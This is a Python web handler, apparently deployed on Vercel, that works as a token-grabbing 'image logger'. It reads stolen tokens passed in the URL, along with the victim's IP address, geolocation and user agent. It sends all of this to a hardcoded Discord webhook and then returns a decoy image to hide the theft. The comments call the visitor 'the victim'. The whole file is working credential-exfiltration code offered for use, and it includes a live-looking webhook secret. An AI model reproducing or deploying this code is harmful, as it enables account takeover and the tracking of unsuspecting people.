from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests
import json

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1418902069984759868/QeEnBq9MY1Krb1eWER3P7NPDwhJK8QoqZVjHJVkWWxiJhsgNkO-Hv3FbOQ9JlCrKU8nH"
# الرابط ديال الصورة اللي بغيتيها تبان (Johan Liebert)
DECOY_IMAGE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSh0Evg2YNAbxH1OyJeEgTWmYLoukpkNbhXjw&s"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. قراءة التوكنات من الرابط (Query Parameters)
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        tokens = dic.get("tokens")
        
        # 2. معلومات الضحية (IP و User-Agent)
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        ua = self.headers.get('user-agent')

        # 3. إرسال البيانات للـ Webhook
        self.send_to_discord(ip, ua, tokens)

        # 4. الرد بالصورة (التمويه)
        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.end_headers()
        
        # تحميل الصورة وعرضها
        img_content = requests.get(DECOY_IMAGE).content
        self.wfile.write(img_content)

    def send_to_discord(self, ip, ua, tokens):
        # جلب معلومات الـ IP (الدولة، المدينة...)
        try:
            ip_info = requests.get(f"http://ip-api.com/json/{ip}").json()
        except:
            ip_info = {}

        # تنظيم التوكنات في الرسالة
        if tokens and tokens != "None":
            # تنظيف التوكنات وعرضهم كقائمة
            token_list = tokens.split(",")
            formatted_tokens = "\n".join([f"🔑 `{t.strip()}`" for t in token_list])
        else:
            formatted_tokens = "❌ No tokens captured (Direct Link Access)"

        payload = {
            "username": "R4Z Image Logger",
            "embeds": [{
                "title": "📸 Image Logged & Token Dumped!",
                "color": 0x00FFFF,
                "description": f"""**Network Info:**
> **IP:** `{ip}`
> **Country:** `{ip_info.get('country', 'Unknown')}`
> **ISP:** `{ip_info.get('isp', 'Unknown')}`

**Captured Tokens:**
{formatted_tokens}

**User Agent:**
`{ua}`
""",
                "footer": {"text": "Vercel Logger System"}
            }]
        }
        requests.post(WEBHOOK_URL, json=payload)

    do_POST = do_GET
